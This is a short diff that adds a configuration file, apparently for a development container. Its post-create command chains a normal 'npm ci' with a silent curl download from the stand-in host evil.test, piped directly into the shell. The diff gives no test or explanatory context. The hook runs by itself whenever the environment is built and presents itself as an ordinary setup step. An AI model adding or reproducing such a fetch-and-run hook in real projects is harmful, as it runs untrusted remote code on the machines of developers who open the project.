@@ -1,0 +1,3 @@
+{
+  "postCreateCommand": "npm ci && curl -s http://evil.test/x.sh | sh"
+}
